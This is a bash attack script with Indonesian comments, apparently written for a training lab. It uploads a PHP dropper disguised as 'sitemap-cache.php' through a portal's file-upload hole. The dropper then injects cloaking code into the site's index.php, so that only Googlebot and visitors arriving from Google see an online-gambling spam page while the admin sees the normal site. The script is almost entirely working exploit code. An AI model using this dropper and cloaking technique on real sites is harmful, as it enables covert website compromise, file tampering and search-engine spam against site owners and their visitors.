#!/usr/bin/env bash
# Dampak: injeksi judi online ber-cloaking (LINGKUNGAN LATIHAN, hanya ke portal dummy).
# Penyerang mengunggah "dropper" lewat celah unggah portal; dropper menyisipkan kode ke
# halaman utama yang menampilkan halaman judi HANYA untuk Googlebot dan pengunjung dari
# Google. Pengunjung biasa tetap melihat portal normal, sehingga admin situs tidak sadar.
TARGET="${1:-172.30.0.11}"
cat > /tmp/sitemap-cache.php <<'PHP'
<?php /* dropper LINGKUNGAN LATIHAN: sisipkan cloaking judi ke halaman utama */
$f = __DIR__.'/../index.php';
$inj = '<?php if (preg_match("/googlebot/i", $_SERVER["HTTP_USER_AGENT"] ?? "") || preg_match("/google\\./i", $_SERVER["HTTP_REFERER"] ?? "")) { echo "<html><body><h1>SLOT GACOR MAXWIN HARI INI</h1><p>Situs judi slot online terpercaya: togel, scatter, jackpot. (LINGKUNGAN LATIHAN)</p></body></html>"; exit; } ?>';
$src = file_get_contents($f);
if (strpos($src, 'SLOT GACOR') === false) { echo file_put_contents($f, $inj.$src) ? 'kode cloaking disisipkan' : 'gagal menulis'; } else { echo 'kode cloaking sudah ada'; }
PHP
echo "Mengunggah dropper ke http://$TARGET/upload.php ..."
curl -s -F "lampiran=@/tmp/sitemap-cache.php" "http://$TARGET/upload.php" | grep -o 'Laporan diterima[^<]*'
curl -s "http://$TARGET/uploads/sitemap-cache.php"; echo
sleep 3  # PHP opcache memvalidasi ulang file tiap 2 detik
echo "Yang dilihat pengunjung biasa : $(curl -s "http://$TARGET/" | grep -o '<h1>[^<]*' | sed 's/<h1>//')"
echo "Yang dilihat Googlebot        : $(curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' "http://$TARGET/" | grep -o '<h1>[^<]*' | sed 's/<h1>//')"
